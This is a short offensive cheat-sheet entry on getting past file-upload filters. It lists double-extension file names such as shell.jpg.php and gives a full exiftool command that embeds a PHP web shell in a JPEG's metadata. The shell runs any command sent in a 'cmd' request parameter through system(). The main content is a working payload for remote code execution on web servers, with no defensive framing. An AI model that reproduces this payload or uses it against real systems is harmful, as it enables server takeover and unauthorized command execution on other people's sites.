Shell bypass some case for filter
1. shell.gif.php
2. shell.jpg.php

We need embeded php code in images as:

Create malicous image file in rce.jpg by exiftool

`exiftool -DocumentName="<h1>PHP Shell<br><?php if(isset(\$_REQUEST['cmd'])){echo '<pre>';\$cmd = (\$_REQUEST['cmd']);system(\$cmd);echo '</pre>';} __halt_compiler();?></h1>" shell.jpg`
